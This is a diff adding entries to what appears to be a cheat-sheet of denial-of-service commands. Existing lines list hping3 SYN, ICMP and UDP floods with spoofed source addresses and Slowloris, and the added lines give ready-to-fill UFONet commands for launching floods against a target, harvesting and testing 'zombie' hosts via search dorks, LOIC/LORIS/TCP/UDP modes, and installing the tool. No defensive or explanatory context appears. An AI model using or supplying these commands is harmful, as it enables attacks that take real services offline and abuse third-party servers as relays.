@@ -167,6 +167,20 @@ Hping3 SYN flood random source: sudo hping3 -S --flood --rand-source -p 80 {targ
 Hping3 ICMP flood: sudo hping3 --icmp --flood {target}
 Hping3 UDP flood: sudo hping3 --udp --flood -p 53 {target}
 Slowloris (HTTP): slowloris {target} -p 80 -s 500
+UFONet launch: ufonet -a {target} -r 100
+UFONet with rounds: ufonet -a {target} -r 500 --threads 200
+UFONet search zombies: ufonet -s "dork" --auto
+UFONet download zombies: ufonet --download-zombies
+UFONet test zombies: ufonet --test-all
+UFONet list zombies: ufonet --list-zombies
+UFONet web GUI: ufonet --gui
+UFONet update: ufonet --update
+UFONet attack methods: ufonet -a {target} --db
+UFONet LOIC mode: ufonet -a {target} --loic 100
+UFONet LORIS mode: ufonet -a {target} --loris 100
+UFONet TCP flood: ufonet -a {target} --tcp 100
+UFONet UDP flood: ufonet -a {target} --udp 100
+Install UFONet: sudo apt-get install -y ufonet || cd /opt && sudo git clone https://github.com/epsylon/ufonet.git && cd ufonet && sudo python3 setup.py install
 Install hping3: sudo apt-get install -y hping3
 Install slowloris: sudo pip3 install slowloris
 
